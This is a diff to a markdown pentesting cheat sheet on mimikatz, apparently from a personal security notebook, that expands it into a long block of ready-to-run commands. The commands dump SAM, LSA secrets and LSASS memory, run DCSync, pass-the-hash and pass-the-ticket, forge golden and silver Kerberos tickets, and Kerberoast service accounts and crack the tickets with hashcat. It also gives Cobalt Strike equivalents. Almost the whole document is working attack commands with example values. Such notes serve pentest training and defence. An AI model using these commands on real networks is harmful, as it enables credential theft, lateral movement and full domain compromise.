@@ -21,65 +21,310 @@ Kiwi module in [a meterpreter in metasploit](metasploit.md) is an adaptation of 
 
 Download from: https://github.com/ParrotSec/mimikatz.git
 
-## Basic usage
+## Basic usage 
 
-```bash
-# Impersonate as NT Authority/SYSTEM (having permissions for it).
+
+**In most internal pentests**, the most common chain is:
+
+```
+sekurlsa::logonpasswords  
+↓  
+extract NTLM / AES keys  
+↓  
+Overpass-the-Hash  
+↓  
+request TGT  
+↓  
+Pass-the-Ticket  
+↓  
+lateral movement (SMB / WinRM / PSExec)
+```
+
+
+```powershell
+########################################  
+# Basic privilege preparation  
+########################################
+
+# Enable debug privilege  
+.\mimikatz.exe 
+privilege::debug
+  
+# Impersonate NT AUTHORITY\SYSTEM (if allowed)  
+.\mimikatz.exe 
 token::elevate
 
-# List users and hashes of the machine
-lsadump::sam
-
-# Enable debug mode for our user
-privilege::debug
-
-# List users logged in the machine and still in memory
-sekurlsa::logonPasswords full
-
-# Pass The Hash attack in windows:
-# 1. Run mimikatz
-mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /domain:<DOMAIN> /run:<Command>" exit
-# sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password
-# /run:<Command>: For example /run:cmd.exe
-# 2. After that, we can use cmd.exe to execute commands in the user's context. 
-
-# Example for Pass The Hash attack in windows:
-mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe
+  
+########################################  
+# Dump credentials from local security databases  
+########################################  
+  
+# Dump local SAM database  
+.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"  
+  
+# Dump LSA secrets  
+.\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"
 
 
-# Run a dcsync attack:
-.\mimikatz.exe privilege::debug "lsadump::dcsync /domain:$domain /user:Administrator" exit
+  
+########################################  
+# Dump credentials from LSASS memory  
+########################################  
+  
+# Dump credentials from LSASS  
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"  
+  
+# List kerberos tickets in memory  
+.\mimikatz.exe "sekurlsa::tickets" "exit"  
+  
+# Dump kerberos AES keys  
+.\mimikatz.exe "sekurlsa::ekeys" "exit"  
+  
+# Dump Terminal Services credentials  
+.\mimikatz.exe "sekurlsa::tspkg" "exit"  
+  
+# Dump DPAPI masterkeys  
+.\mimikatz.exe "sekurlsa::dpapi" "exit"
 
-#####
-# Analyze a lsaass dump file:
-#####
-# Using 'mimikatz.log' for logfile
-mimikatz # log
-# Switch to MINIDUMP : 'lsass.dmp'
-mimikatz # sekurlsa::minidump lsass.dmp
-# Opening : 'lsass.dmp' file for minidump...
-mimikatz # sekurlsa::logonpasswords
-###########
+
+########################################  
+# Domain credential attacks  
+########################################  
+  
+# Inject into LSASS and dump domain credentials  
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /inject" "exit"  
+  
+# Perform DCSync attack to dump domain credentials remotely  
+.\mimikatz.exe "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
+.\mimikatz.exe "lsadump::dcsync /domain:corp.com /all" "exit"
+
+########################################  
+# Pass-the-Hash attack  
+########################################  
+  
+# Create a process using NTLM hash  
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /ntlm:<NTLM_HASH> /domain:<DomainFQDN>" "exit"  
+
+# Example  
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /ntlm:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local" "exit"
+
+
+# Use NTLM hash to request a Kerberos TGT (Overpass-the-Hash)
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /rc4:<NTLM_HASH>" "exit"
+  
+# Example  
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe" "exit"
+
+# Use AES key instead of NTLM
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /aes256:<AES_KEY>" "exit"
+
+# Example  
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:corp.local /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /run:powershell.exe" "exit"
+  
+########################################  
+# Pass-the-Ticket (Kerberos ticket reuse)
+########################################  
+  
+# List kerberos tickets currently loadedand dump them  
+.\mimikatz.exe "kerberos::list /dump" "exit"  
+  
+# Inject a kerberos ticket into the currenct session
+.\mimikatz.exe "kerberos::ptt <TGT_ticket.kirbi>" "exit"
+.\mimikatz.exe "kerberos::ptt <TGS_ticket.kirbi>" "exit"
+
+
+  
+########################################  
+# DCSync (replicate AD password database)  
+########################################  
+  
+# Replicate domain credential data from domain controller  
+.\mimikatz.exe "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
+
+# Example  
+.\mimikatz.exe "lsadump::dcsync /domain:corp.com /all" "exit"
+
+
+  
+########################################  
+# Golden Ticket (forge Kerberos TGT)  
+########################################  
+  
+# Forge a kerberos TGT using krbtgt hash  
+.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DomainFQDN> /sid:<DomainSID> /krbtgt:<KRBTGT_HASH> /ptt" "exit"  
+
+# Example  
+.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /krbtgt:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt" "exit"
+  
+  
+########################################  
+# Silver Ticket (forge service ticket)  
+########################################  
+  
+# Forge a service ticket for a specific service  
+.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DomainFQDN> /sid:<DomainSID> /target:<server> /service:cifs /rc4:<SERVICE_HASH> /ptt" "exit"
+
+# Example  
+.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /target:fileserver.corp.local /service:cifs /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt" "exit"
+
+########################################  
+# Remote session enumeration  
+########################################  
+  
+# List RDP/TS sessions  
+.\mimikatz.exe "ts::sessions" "exit"  
+  
+# List credential vault entries  
+.\mimikatz.exe "vault::list" "exit"  
+  
+  
+########################################  
+# Work with LSASS dump files  
+########################################  
+  
+# Dump LSASS memory to file  
+.\mimikatz.exe "sekurlsa::minidump c:\temp\lsass.dmp" "exit"  
+  
+# Load LSASS dump for analysis  
+.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"  
+  
+  
+########################################  
+# Export kerberos tickets for Pass-The-Ticket  
+########################################  
+  
+# Export kerberos tickets  
+sekurlsa::tickets /export  
+  
+# Inject exported ticket into current session  
+kerberos::ptt {ticketname}  
+
+# Example  
+kerberos::ptt administrator@krbtgt-HTB.LOCAL.kirbi
+  
+# Access remote machine using injected ticket  
+dir \\machine2\c$  
+
+# Example  
+dir \\dc01.corp.local\c$
+  
+# Execute command remotely using injected ticket  
+psexec \\machine2 cmd.exe  
+  
+  
+########################################  
+# Kerberoasting (requesting service tickets)  
+########################################  
+  
+# Enumerate SPNs  
+setspn.exe -Q */*  
+
+# Example  
+setspn.exe -Q MSSQLSvc/*
+  
+# Request a Kerberos TGS ticket for a service  
+Add-Type -AssemblyName System.IdentityModel  
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"  
+  
+# Request tickets for all SPNs  
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
+  
+  
+########################################  
+# Extract kerberos tickets for offline cracking  
+########################################  
+  
+# Launch mimikatz  
+.\mimikatz.exe  
+  
+# Enable base64 output  
+base64 /out:true  
+  
+# Export kerberos tickets  
+kerberos::list /export  
+  
+# Remove line breaks from base64 blob  
+echo "<base64 blob>" | tr -d \\n  
+  
+# Decode base64 ticket into .kirbi file  
+cat encoded_file | base64 -d > ticket.kirbi  
+  
+  
+########################################  
+# Convert kerberos ticket to crackable hash  
+########################################  
+  
+# Convert kirbi ticket to john format  
+python2.7 kirbi2john.py ticket.kirbi  
+  
+# Example  
+python2.7 kirbi2john.py sqldev.kirbi  
+  
+# Convert john output to hashcat format  
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > tgs_hash  
+  
+# Crack kerberos ticket  
+hashcat -m 13100 tgs_hash /usr/share/wordlists/rockyou.txt  
+  
+# Example  
+hashcat -m 13100 sqldev_hash /usr/share/wordlists/rockyou.txt
+  
+########################################  
+# Cobalt Strike mimikatz command format  
+########################################  
+  
+# Dump LSASS credentials  
+mimikatz privilege::debug  
+mimikatz token::elevate  
+mimikatz sekurlsa::logonpasswords  
+  
+# Pass-the-hash  
+mimikatz privilege::debug  
+mimikatz sekurlsa::pth /user:<UserName> /ntlm:<NTLM_HASH> /domain:<DomainFQDN>  
+  
+# List kerberos tickets  
+mimikatz sekurlsa::tickets  
+  
+# Dump Terminal Services credentials  
+mimikatz sekurlsa::tspkg  
+  
+# Dump LSASS to file  
+mimikatz sekurlsa::minidump c:\temp\lsass.dmp  
+  
+# Dump DPAPI masterkeys  
+mimikatz sekurlsa::dpapi  
+  
+# Dump kerberos AES keys  
+mimikatz sekurlsa::ekeys  
+  
+# Dump SAM database  
+mimikatz lsadump::sam  
+  
+# Dump LSA secrets  
+mimikatz lsadump::secrets  
+  
+# Dump domain credentials from LSASS  
+mimikatz privilege::debug  
+mimikatz token::elevate  
+mimikatz lsadump::lsa /inject  
+  
+# Perform DCSync  
+mimikatz lsadump::dcsync /domain:<DomainFQDN> /all  
+  
+# List kerberos tickets  
+mimikatz kerberos::list /dump  
+  
+# Inject kerberos ticket  
+mimikatz kerberos::ptt <PathToKirbiFile>  
+  
+# List RDP sessions  
+mimikatz ts::sessions  
+  
+# List vault credentials  
+mimikatz vault::list
 
 ```
 
-
-## PassTheTicket attack
-
-```
-# Export the tickets existing in machine1 so they can be used 
-sekurlsa::tickets /export
-
-# That will generate a lot of tickets. To pass the ticket to our context
-kerberos::ptt  {ticketname}
-
-# Now the ticket is loaded in our machine 1. We can now do a dir on machine2
-dir \\machine2\c$
-
-# Or 
-psexec \\machine2 cmd.exe
-
-```
 
 ## An Example
 
@@ -110,21 +355,6 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 ```powershell
 setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
-```
-
-
-**4.** Extract Tickets from Memory with Mimikatz
-
-```cmd-session
-# Launch mimikatz
-mimikatz.exe
-
-# Specify base64
-base64 /out:true
-# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.
-
-# Export the tickets
-kerberos::list /export 
 ```
 
 **5.** Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.
